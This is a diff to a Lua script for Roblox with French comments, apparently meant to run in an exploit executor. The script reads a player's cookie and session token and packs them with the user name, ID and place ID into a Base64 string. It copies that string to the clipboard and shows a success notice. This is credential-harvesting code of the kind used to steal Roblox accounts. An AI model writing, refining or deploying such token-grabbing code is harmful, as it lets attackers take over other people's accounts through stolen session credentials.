@@ -19,25 +19,17 @@ local function getCookie()
     return cookie or "Cookie non trouvé"
 end
 
--- Fonction pour copier les données encodées en Base64
+-- Fonction pour copier un texte en Base64
 local function copyToClipboardBase64(token, userId, userName)
-    local data = {
-        player_name = userName,
-        player_id = userId,
-        token = token,
-        place_id = game.PlaceId,
-        time = os.time(),
-        platform = "Android / Clipboard"
-    }
+    -- Texte simple à copier
+    local text = "Nom: "..userName.."\nID: "..userId.."\nToken: "..token.."\nPlace: "..game.PlaceId.."\nTemps: "..os.time().."\nPlateforme: Android / Clipboard"
     
-    local jsonData = HttpService:JSONEncode(data)
-    local base64Data = HttpService:UrlEncode(jsonData) -- Encode en "Base64" via UrlEncode
-    -- Pour un vrai Base64 Lua, tu peux utiliser : 
-    -- local base64Data = game:GetService("HttpService"):EncodeBase64(jsonData)
+    -- Encodage Base64
+    local base64Data = HttpService:EncodeBase64(text)
     
     if setclipboard then
         setclipboard(base64Data)
-        print("Données copiées en Base64 dans le presse‑papier")
+        print("Texte copié en Base64 dans le presse‑papier")
     else
         warn("setclipboard non supporté sur cet exécuteur")
         print(base64Data)
@@ -55,6 +47,6 @@ end
 -- Notification locale
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "Succès",
-    Text = "Données copiées en Base64 dans le presse‑papier",
+    Text = "Texte copié en Base64 dans le presse‑papier",
     Duration = 5
 })
